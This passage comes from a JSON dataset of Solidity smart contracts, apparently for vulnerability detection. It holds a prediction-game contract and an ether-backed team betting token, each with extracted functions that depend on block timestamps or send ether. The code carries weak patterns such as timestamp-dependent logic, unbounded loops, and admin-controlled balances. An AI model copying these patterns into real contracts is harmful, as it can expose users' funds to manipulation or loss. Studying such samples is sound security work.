HWCIntegration is BaseGameLogic {\n event NewHWCRegister(address owner, string aD, string aW);\n constructor(string _name, string _symbol) BaseGameLogic(_name, _symbol) public {}\n struct HWCInfo {\n string aDeposit;\n string aWithdraw;\n uint deposit;\n uint index1;\n }\n uint public cHWCtoEth = 0;\n uint256 public prizeFundHWC = 0;\n mapping (address => HWCInfo) hwcAddress;\n address[] hwcAddressList;\n function _addToFundHWC(uint256 _val) internal whenNotPaused {\n prizeFundHWC = prizeFundHWC.add(_val.mul(prizeFundFactor).div(10000));\n }\n function registerHWCDep(string _a) public {\n require(bytes(_a).length == 34);\n hwcAddress[msg.sender].aDeposit = _a;\n if(hwcAddress[msg.sender].index1 == 0){\n hwcAddress[msg.sender].index1 = hwcAddressList.push(msg.sender);\n }\n emit NewHWCRegister(msg.sender, _a, '');\n }\n function registerHWCWit(string _a) public {\n require(bytes(_a).length == 34);\n hwcAddress[msg.sender].aWithdraw = _a;\n if(hwcAddress[msg.sender].index1 == 0){\n hwcAddress[msg.sender].index1 = hwcAddressList.push(msg.sender);\n }\n emit NewHWCRegister(msg.sender, '', _a);\n }\n function getHWCAddressCount() public view returns (uint){\n return hwcAddressList.length;\n }\n function getHWCAddressByIndex(uint _index) public view returns (string aDeposit, string aWithdraw, uint d) {\n require(_index < hwcAddressList.length);\n return getHWCAddress(hwcAddressList[_index]);\n }\n function getHWCAddress(address _val) public view returns (string aDeposit, string aWithdraw, uint d) {\n aDeposit = hwcAddress[_val].aDeposit;\n aWithdraw = hwcAddress[_val].aWithdraw;\n d = hwcAddress[_val].deposit;\n }\n function setHWCDeposit(address _user, uint _val) external onlyAdmin {\n hwcAddress[_user].deposit = _val;\n }\n function createTokenByHWC(address _userTo, uint256 _parentId) external onlyAdmin whenNotPaused returns (uint) {\n uint256 tokenPrice = basePrice.div(1e10).mul(cHWCtoEth);\n if(_parentId > 0) {\n tokenPrice = calculateTokenPrice(_parentId);\n tokenPrice = tokenPrice.div(1e10).mul(cHWCtoEth);\n uint gameFee = tokenPrice.mul(gameCloneFee).div(10000);\n _addToFundHWC(gameFee);\n uint256 ownerProceed = tokenPrice.sub(gameFee);\n address tokenOwnerAddress = tokenOwner[_parentId];\n hwcAddress[tokenOwnerAddress].deposit = hwcAddress[tokenOwnerAddress].deposit + ownerProceed;\n } else {\n _addToFundHWC(tokenPrice);\n }\n return _createToken(_parentId, _userTo);\n }\n function setCourse(uint _val) external onlyAdmin {\n cHWCtoEth = _val;\n }\n}\ncontract SolutionGame is HWCIntegration {\n uint256 countWinnerPlace;\n mapping (uint256 => uint256) internal prizeDistribution;\n mapping (uint256 => uint256) internal prizesByPlace;\n mapping (uint256 => uint256) internal scoreByPlace;\n mapping (uint => uint) winnerMap;\n uint[] winnerList;\n mapping (uint256 => uint256) internal prizesByPlaceHWC;\n bool isWinnerTime = false;\n modifier whenWinnerTime() {\n require(isWinnerTime);\n _;\n }\n constructor(string _name, string _symbol) HWCIntegration(_name, _symbol) public {\n countWinnerPlace = 0;\n }\n function() external payable {\n _addToFund(msg.value, true);\n }\n function setWinnerTimeStatus(bool _status) external onlyOwner {\n isWinnerTime = _status;\n }\n function withdrawBalance() external onlyOwner {\n owner.transfer(address(this).balance.sub(prizeFund));\n }\n function setCountWinnerPlace(uint256 _val) external onlyOwner {\n countWinnerPlace = _val;\n }\n function setWinnerPlaceDistribution(uint256 place, uint256 _val) external onlyOwner {\n require(place <= countWinnerPlace);\n require(_val <= 10000);\n uint256 testVal = 0;\n uint256 index;\n for (index = 1; index <= countWinnerPlace; index ++) {\n if(index != place) {\n testVal = testVal + prizeDistribution[index];\n }\n }\n testVal = testVal + _val;\n require(testVal <= 10000);\n prizeDistribution[place] = _val;\n }\n function setCountWinnerByPlace(uint256 place, uint256 _winnerCount, uint256 _winnerScore) public onlyOwner whenPaused {\n require(_winnerCount > 0);\n require(place <= countWinnerPlace);\n prizesByPlace[place] = prizeFund.mul(prizeDistribution[place]).div(10000).div(_winnerCount);\n prizesByPlaceHWC[place] = prizeFundHWC.mul(prizeDistribution[place]).div(10000).div(_winnerCount);\n scoreByPlace[place] = _winnerScore;\n }\n function checkIsWinner(uint _tokenId) public view whenPaused onlyOwnerOf(_tokenId)\n returns (uint place) {\n place = 0;\n uint score = getScore(_tokenId);\n for(uint index = 1; index <= countWinnerPlace; index ++) {\n if (score == scoreByPlace[index]) {\n place = index;\n break;\n }\n }\n }\n function getMyPrize() external whenWinnerTime {\n uint[] memory tokenList = tokensOfOwner(msg.sender);\n for(uint index = 0; index < tokenList.length; index ++) {\n getPrizeByToken(tokenList[index]);\n }\n }\n function getPrizeByToken(uint _tokenId) public whenWinnerTime onlyOwnerOf(_tokenId) {\n uint place = checkIsWinner(_tokenId);\n require (place > 0);\n uint prize = prizesByPlace[place];\n if(prize > 0) {\n if(winnerMap[_tokenId] == 0) {\n winnerMap[_tokenId] = prize;\n winnerList.push(_tokenId);\n address _owner = tokenOwner[_tokenId];\n if(_owner != address(0)){\n uint hwcPrize = prizesByPlaceHWC[place];\n hwcAddress[_owner].deposit = hwcAddress[_owner].deposit + hwcPrize;\n _owner.transfer(prize);\n }\n }\n }\n }\n function getWinnerList() external view onlyAdmin returns (uint[]) {\n return winnerList;\n }\n function getWinnerInfo(uint _tokenId) external view onlyAdmin returns (uint){\n return winnerMap[_tokenId];\n }\n function getResultTable(uint _start, uint _count) external view returns (uint[]) {\n uint[] memory results = new uint[](_count);\n for(uint index = _start; index < tokens.length && index < (_start + _count); index++) {\n results[(index - _start)] = getScore(index);\n }\n return results;\n }\n}",
  "extract_feature": [
    "function _createForecast(uint _tokenId, uint _gameId, uint _forecastData) internal whenNotPaused returns (uint) {\nrequire(_tokenId < tokens.length);\nForecast memory newForecast = Forecast({\ngameId: _gameId,\nforecastBlockNumber: block.number,\nforecastData: _forecastData\n});\nuint newForecastId = forecasts.push(newForecast) - 1;\nforecastToToken[newForecastId] = _tokenId;\ntokenForecasts[_tokenId].push(newForecastId);\ngames[_gameId].forecasts.push(newForecastId);\nemit NewForecast(tokenOwner[_tokenId], _tokenId, newForecastId, _gameId, _forecastData);\nreturn newForecastId;\n}",
    "function calculateTokenPrice(uint _tokenId) public view returns(uint) {\nrequire(exists(_tokenId));\nuint forecastCount = getForecastCount(_tokenId, block.number, true);\nreturn (forecastCount.add(1)).mul(basePrice).mul(priceFactor).div(10000);\n}",
    "function getForecastCount(uint _tokenId, uint _blockNumber, bool isReleased) public view returns(uint) {\nrequire(exists(_tokenId));\nuint forecastCount = 0 ;\nuint index = 0;\nuint count = tokenForecasts[_tokenId].length;\nfor (index = 0; index < count; index++) {\nif(forecasts[tokenForecasts[_tokenId][index]].forecastBlockNumber < _blockNumber){\nif(isReleased) {\nif (games[forecasts[tokenForecasts[_tokenId][index]].gameId].gameDate < block.timestamp) {\nforecastCount = forecastCount + 1;\n}\n} else {\nforecastCount = forecastCount + 1;\n}\n}\n}\nif(tokens[_tokenId].parentId != 0){\nforecastCount = forecastCount.add(getForecastCount(tokens[_tokenId].parentId,\ntokens[_tokenId].createBlockNumber, isReleased));\n}\nreturn forecastCount;\n}",
    "function getScore(uint _tokenId) public view returns (uint){\nuint[] memory _gameForecast = new uint[](65);\nreturn getScore(_tokenId, block.number, _gameForecast);\n}",
    "function getScore(uint _tokenId, uint _blockNumber, uint[] _gameForecast) public view returns (uint){\nuint score = 0;\nuint[] memory _forecasts = forecastOfToken(_tokenId);\nif (_forecasts.length > 0){\nuint256 _index;\nfor(_index = _forecasts.length - 1; _index >= 0 && _index < _forecasts.length ; _index--){\nif(forecasts[_forecasts[_index]].forecastBlockNumber < _blockNumber &&\n_gameForecast[forecasts[_forecasts[_index]].gameId] == 0 &&\nblock.timestamp > games[forecasts[_forecasts[_index]].gameId].gameDate\n){\nscore = score.add(calculateScore(\nforecasts[_forecasts[_index]].gameId,\nforecasts[_forecasts[_index]].forecastData\n));\n_gameForecast[forecasts[_forecasts[_index]].gameId] = forecasts[_forecasts[_index]].forecastBlockNumber;\n}\n}\n}\nif(tokens[_tokenId].parentId != 0){\nscore = score.add(getScore(tokens[_tokenId].parentId, tokens[_tokenId].createBlockNumber, _gameForecast));\n}\nreturn score;\n}"
  ]
},
{
  "_id": {
    "$oid": "663abaacfa0e1460cdfa1fab"
  },
  "filename": "9998.sol",
  "content": "pragma solidity ^0.4.21;\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return a / b;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract Ownable {\n address public owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n modifier onlyOwner() {\n require(msg.sender == owner);\n _;\n }\n function transferOwnership(address newOwner) public onlyOwner {\n require(newOwner != address(0));\n emit OwnershipTransferred(owner, newOwner);\n owner = newOwner;\n }\n}\ncontract StandardToken {\n using SafeMath for uint256;\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n mapping(address => uint256) internal balances_;\n mapping(address => mapping(address => uint256)) internal allowed_;\n uint256 internal totalSupply_;\n string public name;\n string public symbol;\n uint8 public decimals;\n function totalSupply() public view returns (uint256) {\n return totalSupply_;\n }\n function balanceOf(address _owner) public view returns (uint256) {\n return balances_[_owner];\n }\n function allowance(address _owner, address _spender) public view returns (uint256) {\n return allowed_[_owner][_spender];\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[msg.sender]);\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n emit Transfer(msg.sender, _to, _value);\n return true;\n }\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\n require(_to != address(0));\n require(_value <= balances_[_from]);\n require(_value <= allowed_[_from][msg.sender]);\n balances_[_from] = balances_[_from].sub(_value);\n balances_[_to] = balances_[_to].add(_value);\n allowed_[_from][msg.sender] = allowed_[_from][msg.sender].sub(_value);\n emit Transfer(_from, _to, _value);\n return true;\n }\n function approve(address _spender, uint256 _value) public returns (bool) {\n allowed_[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n}\ncontract EthTeamContract is StandardToken, Ownable {\n event Buy(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event Sell(address indexed token, address indexed from, uint256 value, uint256 weiValue);\n event BeginGame(address indexed team1, address indexed team2, uint64 gameTime);\n event EndGame(address indexed team1, address indexed team2, uint8 gameResult);\n event ChangeStatus(address indexed team, uint8 status);\n uint256 public price;\n uint8 public status;\n uint64 public gameTime;\n uint64 public finishTime;\n address public feeOwner;\n address public gameOpponent;\n function EthTeamContract(\n string _teamName, string _teamSymbol, address _gameOpponent, uint64 _gameTime, uint64 _finishTime, address _feeOwner\n ) public {\n name = _teamName;\n symbol = _teamSymbol;\n decimals = 3;\n totalSupply_ = 0;\n price = 1 szabo;\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n finishTime = _finishTime;\n feeOwner = _feeOwner;\n owner = msg.sender;\n }\n function transfer(address _to, uint256 _value) public returns (bool) {\n if (_to != address(this)) {\n return super.transfer(_to, _value);\n }\n require(_value <= balances_[msg.sender] && status == 0);\n if (gameTime > 1514764800) {\n require(gameTime > block.timestamp);\n }\n balances_[msg.sender] = balances_[msg.sender].sub(_value);\n totalSupply_ = totalSupply_.sub(_value);\n uint256 weiAmount = price.mul(_value);\n msg.sender.transfer(weiAmount);\n emit Transfer(msg.sender, _to, _value);\n emit Sell(_to, msg.sender, _value, weiAmount);\n return true;\n }\n function() payable public {\n require(status == 0 && price > 0);\n if (gameTime > 1514764800) {\n require(gameTime > block.timestamp);\n }\n uint256 amount = msg.value.div(price);\n balances_[msg.sender] = balances_[msg.sender].add(amount);\n totalSupply_ = totalSupply_.add(amount);\n emit Transfer(address(this), msg.sender, amount);\n emit Buy(address(this), msg.sender, amount, msg.value);\n }\n function changeStatus(uint8 _status) onlyOwner public {\n require(status != _status);\n status = _status;\n emit ChangeStatus(address(this), _status);\n }\n function finish() onlyOwner public {\n require(block.timestamp >= finishTime);\n feeOwner.transfer(address(this).balance);\n }\n function beginGame(address _gameOpponent, uint64 _gameTime) onlyOwner public {\n require(_gameOpponent != address(this));\n require(_gameTime == 0 || (_gameTime > 1514764800));\n gameOpponent = _gameOpponent;\n gameTime = _gameTime;\n status = 0;\n emit BeginGame(address(this), _gameOpponent, _gameTime);\n }\n function endGame(address _gameOpponent, uint8 _gameResult) onlyOwner public {\n require(gameOpponent != address(0) && gameOpponent == _gameOpponent);\n uint256 amount = address(this).balance;\n uint256 opAmount = gameOpponent.balance;\n require(_gameResult == 1 || (_gameResult == 2 && amount >= opAmount) || _gameResult == 3);\n EthTeamContract op = EthTeamContract(gameOpponent);\n if (_gameResult == 1) {\n if (amount > 0 && totalSupply_ > 0) {\n uint256 lostAmount = amount;\n if (op.totalSupply() > 0) {\n uint256 feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else {\n op.transferFundAndEndGame();\n }\n } else if (_gameResult == 2) {\n if (amount > opAmount) {\n lostAmount = amount.sub(opAmount).div(2);\n if (op.totalSupply() > 0) {\n feeAmount = lostAmount.div(20);\n lostAmount = lostAmount.sub(feeAmount);\n feeOwner.transfer(feeAmount);\n op.transferFundAndEndGame.value(lostAmount)();\n } else {\n feeOwner.transfer(lostAmount);\n op.transferFundAndEndGame();\n }\n } else if (amount == opAmount) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n } else if (_gameResult == 3) {\n op.transferFundAndEndGame();\n } else {\n revert();\n }\n endGameInternal();\n if (totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n emit EndGame(address(this), _gameOpponent, _gameResult);\n }\n function endGameInternal() private {\n gameOpponent = address(0);\n gameTime = 0;\n status = 0;\n }\n function transferFundAndEndGame() payable public {\n require(gameOpponent != address(0) && gameOpponent == msg.sender);\n if (msg.value > 0 && totalSupply_ > 0) {\n price = address(this).balance.div(totalSupply_);\n }\n endGameInternal();\n }\n}",
  "extract_feature": [
    "function transfer(address _to, uint256 _value) public returns (bool) {\nif (_to != address(this)) {\nreturn super.transfer(_to, _value);\n}\nrequire(_value <= balances_[msg.sender] && status == 0);\nif (gameTime > 1514764800) {\nrequire(gameTime > block.timestamp);\n}\nbalances_[msg.sender] = balances_[msg.sender].sub(_value);\ntotalSupply_ = totalSupply_.sub(_value);\nuint256 weiAmount = price.mul(_value);\nmsg.sender.transfer(weiAmount);\nemit Transfer(msg.sender, _to, _value);\nemit Sell(_to, msg.sender, _value, weiAmount);\nreturn true;\n}",
    "function finish() onlyOwner public {\nrequire(block.timestamp >= finishTime);\nfeeOwner.transfer(address(this).balance);\n}"
  ]
}]